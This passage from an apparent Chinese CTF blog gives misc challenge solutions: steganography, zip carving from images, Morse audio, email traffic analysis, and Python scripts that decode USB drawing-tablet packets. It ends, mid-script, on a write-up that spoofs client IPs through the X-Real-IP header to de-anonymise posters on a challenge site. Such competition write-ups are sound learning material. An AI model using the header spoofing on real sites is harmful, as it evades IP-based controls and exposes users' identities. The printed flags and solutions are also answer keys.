src="https://pic1.imgdb.cn/item/67db7f6688c538a9b5c1669c.png" alt=""></p><p>最终我们得到了这些东西，因为前面的提示铺垫，一看便知道这个/foods文件夹很可疑！</p><p>想不到，又是压缩包！</p><p><img src="https://pic1.imgdb.cn/item/67db7faf88c538a9b5c16772.png" alt=""></p><p>不过，这些食物全是中文，只有一个Bell与众不同</p><p>发现提示：</p><p><img src="https://pic1.imgdb.cn/item/67db800188c538a9b5c167bc.png" alt=""></p><p>我们打开之前的ground</p><p><img src="https://pic1.imgdb.cn/item/67db805088c538a9b5c167f9.png" alt=""></p><p>其中总字数不对劲，而且字符有明显的“粘连”特征，很明显是零宽字符隐写。</p><p><img src="https://pic1.imgdb.cn/item/67db811f88c538a9b5c168a8.png" alt=""></p><p>解密得到base64，然而这里还有一个栅栏密码，我吗得到提示的两组数字，96，30</p><p>进行解密：</p><p><img src="https://pic1.imgdb.cn/item/67db81b188c538a9b5c1690e.png" alt=""></p><p>得到flag</p><h2 id="题目：少女的秘密"><a href="#题目：少女的秘密" class="headerlink" title="题目：少女的秘密"></a>题目：少女的秘密</h2><p>打开题⽬，发现提示信息：<br><img src="https://pic1.imgdb.cn/item/67db834c88c538a9b5c169d9.png" alt=""><br>其中z01是WinRAR或⼀些压缩软件进⾏分卷压缩后部分压缩包的名字，所有图⽚中可能藏了压缩⽂件，⽽且不⽌藏了⼀个</p><p>尝试binwalk文件提取，只有一张图片：</p><p><img src="https://pic1.imgdb.cn/item/67db851f88c538a9b5c16af2.png" alt=""></p><p>通过这张图片，我们可以知道图片的文件头文件尾。</p><p>使⽤010editor将压缩文件分割出来</p><p>分割点⼀：（FF D8是图片的开始）</p><p><img src="https://pic1.imgdb.cn/item/67db846f88c538a9b5c16a93.png" alt=""></p><p>分割点⼆（FF D9是图片的结束）</p><p><img src="https://pic1.imgdb.cn/item/67db84a688c538a9b5c16aac.png" alt=""></p><p>我们提取图片上面和下面的部分：</p><p>提取为zz01 和 zz02.</p><p>发现压缩包加密，使用随波逐流进行解密：</p><p><img src="https://pic1.imgdb.cn/item/67dbcf8488c538a9b5c1ddde.png" alt=""></p><p>查看压缩包：</p><p><img src="https://pic1.imgdb.cn/item/67dbcfc588c538a9b5c1de7a.png" alt=""></p><p>文件流里发现flag</p><p><img src="https://pic1.imgdb.cn/item/67dbd0c088c538a9b5c1e227.png" alt=""></p><p>解密得到flag</p><h2 id="题目：少女的战歌"><a href="#题目：少女的战歌" class="headerlink" title="题目：少女的战歌"></a>题目：少女的战歌</h2><p>音频隐写（摩斯密码）</p><p><img src="https://pic1.imgdb.cn/item/67db88bb88c538a9b5c16c06.png" alt=""></p><p>稍做处理进行解码<br>flag{0n3_wh0_5tr1d35_th3_r0y4l_p47h_w1th_53t5un4}</p><h2 id="题目：少女的独戏"><a href="#题目：少女的独戏" class="headerlink" title="题目：少女的独戏"></a>题目：少女的独戏</h2><p>邮件流量分析题<br>通过wireshark追踪tcp流，在第5组发现提示信息：</p><p><img src="https://pic1.imgdb.cn/item/67db8d4b88c538a9b5c16fc0.png" alt=""></p><p><img src="https://pic1.imgdb.cn/item/67db8d8a88c538a9b5c16fc9.png" alt=""></p><p>同时找到了公钥和私钥：</p><p><img src="https://pic1.imgdb.cn/item/67db8dcb88c538a9b5c16fd2.png" alt=""></p><p><img src="https://pic1.imgdb.cn/item/67db8e2388c538a9b5c16ff3.png" alt=""></p><p>在第7组有压缩包与密码，压缩包以base64形式存在：</p><p>把信息解密成base64：</p><p><img src="https://pic1.imgdb.cn/item/67dbb67388c538a9b5c19e70.png" alt=""></p><p>密码是： <code>sA]w5%#H&#39;Pfz&lt;dSHNG&lt;+</code><br>解压得flag</p><p><img src="https://pic1.imgdb.cn/item/67dbb70188c538a9b5c1a026.png" alt=""></p><h2 id="题目：真正的misc4"><a href="#题目：真正的misc4" class="headerlink" title="题目：真正的misc4"></a>题目：真正的misc4</h2><p><strong><em>这个题的难点主要是数据的处理，提取数据简单带过</em></strong></p><p><strong>数据提取：</strong></p><p>在kali中，使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r 1.pcapng -T fields -e usbhid.data &gt; hiddata.txt</span><br></pre></td></tr></table></figure><p>提取HID数据</p><p><strong>关于数据的处理：</strong></p><p>当然，我们并不知道这个数据是如何处理的，我们要如何把一串字符转换成有效的x,y以及pressure值？</p><p>但是，根据姚神所发的视频，我们可以看到数据的变化过程：</p><p><img src="https://pic1.imgdb.cn/item/67dab65b88c538a9b5c10e71.jpg" alt=""></p><p>我们可以看到，正是这20长度的数据转化成了右边的位置信息。</p><p>虽然转化的过程逻辑我们并不知道，但是，如果我们拥有足够多的转化前数据和转化后数据，是不是就可以爆破出转化的逻辑？（思路参考了tpCTF的ip对应匿名那道题）</p><p>而恰好，视频给我们提供了足够多的数据！我们只要截取视频中足够多帧的数据始末数值，就可以逆向推导出转化过程！</p><p>于是开始分析&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</p><hr><p>这里我从视频中截取了两帧，进行数据的分析</p><p>第一组原始数据是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">02 E1 99 2A B5 18 76 04 1C 00</span><br></pre></td></tr></table></figure><p>对应的解析结果是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Position: [10904, 6318]</span><br><span class="line">Pressure: 1142</span><br><span class="line">PenButtons: [False, False]</span><br><span class="line">Eraser: False</span><br><span class="line">NearProximity: True</span><br><span class="line">HoverDistance: 28</span><br></pre></td></tr></table></figure><p>第二组原始数据是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">02 E0 E3 28 03 18 00 00 0E 00</span><br></pre></td></tr></table></figure><p>对应的解析结果是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Position: [10467, 6147]</span><br><span class="line">Pressure: 0</span><br><span class="line">PenButtons: [False, False]</span><br><span class="line">Eraser: False</span><br><span class="line">NearProximity: True</span><br><span class="line">HoverDistance: 14</span><br></pre></td></tr></table></figure><p>通过对比，注意到以下几点：</p><ol><li>原始数据的前两个字节似乎是固定的（<code>02 E1</code> 和 <code>02 E0</code>），可能表示数据的类型或设备标识。</li><li>位置信息在解析结果中是两个整数，原始数据中可能对应两个连续的字节对（比如 <code>99 2A</code> 和 <code>B5 18</code>）。</li><li>压力值在解析结果中是一个整数，原始数据中可能对应另一个字节对（比如 <code>76 04</code>）。</li><li>其他字段（如按钮状态、橡皮擦、悬停距离等）可能分布在剩余的字节中。</li></ol><p>为了验证这些假设，需要逐一尝试将原始数据的字节组合成整数，并与解析结果进行对比。例如：</p><ul><li><p>对于位置信息，假设 <code>99 2A</code> 和 <code>B5 18</code> 是小端字节序的16位整数。计算它们的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x2A99 = 10905（接近解析结果中的10904）</span><br><span class="line">0x18B5 = 6325（接近解析结果中的6318）</span><br></pre></td></tr></table></figure><p>这表明位置信息确实是由两个连续的字节对组成，且可能是小端字节序。</p></li><li><p>对于压力值，假设 <code>76 04</code> 是小端字节序的16位整数。计算它的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0476 = 1142</span><br></pre></td></tr></table></figure><p>这与解析结果中的压力值完全一致。</p></li><li><p>对于悬停距离，我假设最后一个字节（<code>00</code> 和 <code>0E</code>）表示该值。计算它们的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00 = 0（但解析结果中是28，这表明可能需要进一步分析）</span><br><span class="line">0x0E = 14</span><br></pre></td></tr></table></figure><p>这表明悬停距离可能与最后一个字节有关，但需要结合其他字节进行验证。</p></li></ul><p>通过这些分析，逐渐形成了一个清晰的解析逻辑：</p><ol><li>跳过前两个字节（设备标识）。</li><li>从接下来的字节中提取位置信息（两个连续的字节对，小端字节序）。</li><li>提取压力值（一个字节对，小端字节序）。</li><li>提取其他字段（如按钮状态、橡皮擦、悬停距离）。</li></ol><p>最后，将这些逻辑整理成一个Python实验脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_tablet_data</span>(<span class="params">raw_data</span>):</span><br><span class="line">    <span class="comment"># 将十六进制字符串转换为字节流</span></span><br><span class="line">    byte_data = <span class="built_in">bytes</span>.fromhex(raw_data)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 解析位置信息（假设位置信息占用4个字节，x和y各2个字节，小端字节序）</span></span><br><span class="line">    x = struct.unpack_from(<span class="string">&#x27;&lt;H&#x27;</span>, byte_data, <span class="number">2</span>)[<span class="number">0</span>]  <span class="comment"># 从索引2开始，小端字节序读取2字节</span></span><br><span class="line">    y = struct.unpack_from(<span class="string">&#x27;&lt;H&#x27;</span>, byte_data, <span class="number">4</span>)[<span class="number">0</span>]  <span class="comment"># 从索引4开始，小端字节序读取2字节</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 解析压力信息（假设压力信息占用2个字节，小端字节序）</span></span><br><span class="line">    pressure = struct.unpack_from(<span class="string">&#x27;&lt;H&#x27;</span>, byte_data, <span class="number">6</span>)[<span class="number">0</span>]  <span class="comment"># 从索引6开始，小端字节序读取2字节</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 解析其他信息（假设悬停距离占用1个字节）</span></span><br><span class="line">    hover_distance = byte_data[-<span class="number">2</span>]  <span class="comment"># 倒数第2个字节</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 解析笔按钮和其他状态（假设使用位掩码）</span></span><br><span class="line">    status_byte = byte_data[<span class="number">1</span>]  <span class="comment"># 第2个字节可能包含状态信息</span></span><br><span class="line">    pen_buttons = [(status_byte &amp; <span class="number">0x80</span>) != <span class="number">0</span>, (status_byte &amp; <span class="number">0x40</span>) != <span class="number">0</span>]  <span class="comment"># 假设高位表示按钮状态</span></span><br><span class="line">    eraser = (status_byte &amp; <span class="number">0x20</span>) != <span class="number">0</span>  <span class="comment"># 假设某一位表示橡皮擦状态</span></span><br><span class="line">    near_proximity = (status_byte &amp; <span class="number">0x10</span>) != <span class="number">0</span>  <span class="comment"># 假设某一位表示接近状态</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;Position&#x27;</span>: [x, y],</span><br><span class="line">        <span class="string">&#x27;Pressure&#x27;</span>: pressure,</span><br><span class="line">        <span class="string">&#x27;PenButtons&#x27;</span>: pen_buttons,</span><br><span class="line">        <span class="string">&#x27;Eraser&#x27;</span>: eraser,</span><br><span class="line">        <span class="string">&#x27;NearProximity&#x27;</span>: near_proximity,</span><br><span class="line">        <span class="string">&#x27;HoverDistance&#x27;</span>: hover_distance</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 示例数据</span></span><br><span class="line">    raw_data1 = <span class="string">&quot;02 E1 59 32 9A 15 F2 04 1E 00&quot;</span></span><br><span class="line">    raw_data2 = <span class="string">&quot;02 E0 E3 28 03 18 00 00 0E 00&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 去除空格</span></span><br><span class="line">    raw_data1 = raw_data1.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    raw_data2 = raw_data2.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 解析数据</span></span><br><span class="line">    report1 = parse_tablet_data(raw_data1)</span><br><span class="line">    report2 = parse_tablet_data(raw_data2)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 输出解析结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Tablet Report 1:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> report1.items():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;key&#125;</span>: <span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nTablet Report 2:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> report2.items():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;key&#125;</span>: <span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>我们再次从视频中截取其他几帧，通过实验脚本的验证，虽然有所误差，但误差特别小，认为可以忽略不计。</p><p>那么，可以认为我们已经找到了 HID数据——位置信息 之间的对应关系。</p><p>接下来，写脚本处理txt文件中的数据并绘制图像：</p><ol><li>首先，按照每两个字符间隔一次的格式处理原始的hid数据，并删除空行，清除多余的部分：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_file</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> infile, <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> infile:</span><br><span class="line">            <span class="comment"># 去除行首和行尾的空白字符</span></span><br><span class="line">            line = line.strip()</span><br><span class="line">            <span class="comment"># 跳过空行</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># 如果行长度超过20字符，只取前20个字符</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(line) &gt; <span class="number">20</span>:</span><br><span class="line">                line = line[:<span class="number">20</span>]</span><br><span class="line">            <span class="comment"># 检查是否为16进制格式，并且长度为20</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(line) != <span class="number">20</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># 将每两个字符之间插入空格</span></span><br><span class="line">            formatted_line = <span class="string">&#x27; &#x27;</span>.join([line[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">20</span>, <span class="number">2</span>)])</span><br><span class="line">            <span class="comment"># 写入输出文件</span></span><br><span class="line">            outfile.write(formatted_line + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    input_filename = <span class="string">&#x27;hiddata.txt&#x27;</span>  <span class="comment"># 输入文件名</span></span><br><span class="line">    output_filename = <span class="string">&#x27;processed_data.txt&#x27;</span>  <span class="comment"># 输出文件名</span></span><br><span class="line">    process_file(input_filename, output_filename)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;处理完成，结果已保存到 <span class="subst">&#123;output_filename&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><ol><li>其次，将数据转化成位置信息，这里我们只选择保留x,y坐标和压力值，其他的数据暂时无用。我们按照特定的格式进行输出：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_tablet_data_line</span>(<span class="params">line</span>):</span><br><span class="line">    <span class="comment"># 去除行首和行尾的空白字符，并将每两个字符组合成字节</span></span><br><span class="line">    bytes_str = line.strip().replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(bytes_str) != <span class="number">20</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>  <span class="comment"># 跳过不符合长度要求的行</span></span><br><span class="line">    byte_data = <span class="built_in">bytes</span>.fromhex(bytes_str)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 解析位置信息（x和y各占2字节，小端字节序）</span></span><br><span class="line">    x = struct.unpack_from(<span class="string">&#x27;&lt;H&#x27;</span>, byte_data, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    y = struct.unpack_from(<span class="string">&#x27;&lt;H&#x27;</span>, byte_data, <span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 解析压力信息（2字节，小端字节序）</span></span><br><span class="line">    pressure = struct.unpack_from(<span class="string">&#x27;&lt;H&#x27;</span>, byte_data, <span class="number">6</span>)[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> [x, y, pressure]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_file</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> infile, <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> infile:</span><br><span class="line">            <span class="comment"># 解析每一行数据</span></span><br><span class="line">            data = parse_tablet_data_line(line)</span><br><span class="line">            <span class="keyword">if</span> data:</span><br><span class="line">                <span class="comment"># 写入[x, y, pressure]格式的数据</span></span><br><span class="line">                outfile.write(<span class="string">f&quot;<span class="subst">&#123;data[<span class="number">0</span>]&#125;</span>,<span class="subst">&#123;data[<span class="number">1</span>]&#125;</span>,<span class="subst">&#123;data[<span class="number">2</span>]&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    input_filename = <span class="string">&#x27;processed_data.txt&#x27;</span>  <span class="comment"># 输入的处理后的数据文件名</span></span><br><span class="line">    output_filename = <span class="string">&#x27;position_pressure_data.txt&#x27;</span>  <span class="comment"># 输出的位置和压力数据文件名</span></span><br><span class="line">    process_file(input_filename, output_filename)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;转换完成，结果已保存到 <span class="subst">&#123;output_filename&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><ol><li>接下来，我们只需要画图就可以啦！</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">plot_drawing</span>(<span class="params">input_file, output_image</span>):</span><br><span class="line">    x_coords = []</span><br><span class="line">    y_coords = []</span><br><span class="line">    pressures = []</span><br><span class="line">    </span><br><span class="line">    prev_x = <span class="literal">None</span></span><br><span class="line">    prev_y = <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">            parts = line.strip().split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(parts) != <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">continue</span>  <span class="comment"># 跳过格式不正确的行</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = <span class="built_in">int</span>(parts[<span class="number">0</span>])</span><br><span class="line">                y = <span class="built_in">int</span>(parts[<span class="number">1</span>])</span><br><span class="line">                pressure = <span class="built_in">int</span>(parts[<span class="number">2</span>])</span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                <span class="keyword">continue</span>  <span class="comment"># 跳过无法转换为整数的行</span></span><br><span class="line">            </span><br><span class="line">            x_coords.append(x)</span><br><span class="line">            y_coords.append(y)</span><br><span class="line">            pressures.append(pressure)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 如果压力为0，视为落笔，轨迹不相连</span></span><br><span class="line">            <span class="keyword">if</span> pressure == <span class="number">0</span>:</span><br><span class="line">                prev_x = <span class="literal">None</span></span><br><span class="line">                prev_y = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> prev_x <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> prev_y <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="comment"># 绘制线条</span></span><br><span class="line">                    plt.plot([prev_x, x], [prev_y, y], color=<span class="string">&#x27;black&#x27;</span>, linewidth=<span class="number">0.5</span>)</span><br><span class="line">                prev_x = x</span><br><span class="line">                prev_y = y</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 设置坐标轴范围</span></span><br><span class="line">    plt.xlim(<span class="number">0</span>, <span class="built_in">max</span>(x_coords) * <span class="number">1.1</span>)</span><br><span class="line">    plt.ylim(<span class="number">0</span>, <span class="built_in">max</span>(y_coords) * <span class="number">1.1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 反转y轴（数位板通常y轴向下增加）</span></span><br><span class="line">    plt.gca().invert_yaxis()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 保存图像</span></span><br><span class="line">    plt.savefig(output_image, bbox_inches=<span class="string">&#x27;tight&#x27;</span>)</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    input_filename = <span class="string">&#x27;position_pressure_data.txt&#x27;</span>  <span class="comment"># 输入的位置和压力数据文件名</span></span><br><span class="line">    output_image_filename = <span class="string">&#x27;drawing.png&#x27;</span>  <span class="comment"># 输出的图像文件名</span></span><br><span class="line">    plot_drawing(input_filename, output_image_filename)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;绘图完成，结果已保存到 <span class="subst">&#123;output_image_filename&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>终于，我们获得了原始的图像！！！！！</p><p><img src="https://pic1.imgdb.cn/item/67dabceb88c538a9b5c11133.png" alt=""></p><p>取md5得到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc周报03</title>
      <link href="/2025/03/12/misc%E5%91%A8%E6%8A%A503/"/>
      <url>/2025/03/12/misc%E5%91%A8%E6%8A%A503/</url>
      
        <content type="html"><![CDATA[<h2 id="周报03"><a href="#周报03" class="headerlink" title="周报03"></a>周报03</h2><p><strong><em>【君子坐而论道，少年起而行之。            ——烽火戏诸侯《剑来》】</em></strong></p><h3 id="TPCTF-2025-题目复现"><a href="#TPCTF-2025-题目复现" class="headerlink" title="TPCTF 2025 题目复现"></a>TPCTF 2025 题目复现</h3><p><strong><em><del>（难度有点高，尽力尝试ing）</del></em></strong></p><h4 id="题目：nanonymous-spam"><a href="#题目：nanonymous-spam" class="headerlink" title="题目：nanonymous spam"></a>题目：nanonymous spam</h4><p><img src="https://pic1.imgdb.cn/item/67d01a66066befcec6e34e99.png" alt=""></p><p>题目要求找到匿名垃圾邮件的发送者，打开题目，可以看到留言板上有许多不同的昵称和垃圾信息：</p><p><img src="https://pic1.imgdb.cn/item/67d018d8066befcec6e34e40.png" alt=""></p><p>同时，我们可以在下方发送信息，我们注意到网站已经给我们生成了一个昵称：</p><p><img src="https://pic1.imgdb.cn/item/67d01afa066befcec6e34eb6.png" alt=""></p><p>可以发现的是，如果使用不同的IP访问网站，所显示的昵称是不同的！</p><p>也就是说，所谓的匿名，实则是通过一个“算法”，将你的IP地址转化成看似不规律的字符串。</p><p>那么，如果我们能逆向出这个算法，就可以知道留言板上的信息发送者了！</p><p>然而，想要逆推出算法，我们一定需要大量不同的IP以及对应的匿名昵称来找寻对应关系。</p><p><strong>这里借鉴一下0xFFF队的WP</strong></p><p>我们可以通过 X-Real-IP 这个 HTTP 头来伪造 IP 地址。</p><p>并且也发现第一个 Spam 留言者昵称对应的 IP 地址正是 TPCT 这个 Flag 头的 ASCII 码，这证实了猜想。</p><p>那么我们先从 0.0.0.0 开始递增看一看是否能找到一些规律：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">f = open(&quot;result.txt&quot;, &quot;at&quot;)</span><br><span class="line">for i in range(0, 512):</span><br><span class="line">    ip = i</span><br><span class="line">    a, b, c, d = ip &gt;&gt; 24, (ip &gt;&gt; 16) &amp; 0xff, (ip &gt;&gt; 8) &amp; 0xff, ip &amp; 0xff</span><br><span class="line">    ip_str = &quot;%d.%d.%d.%d&quot; % (a, b, c, d)</span><br><span class="line">    f.write(f&quot;&#123;str(i).zfill(3)&#125; 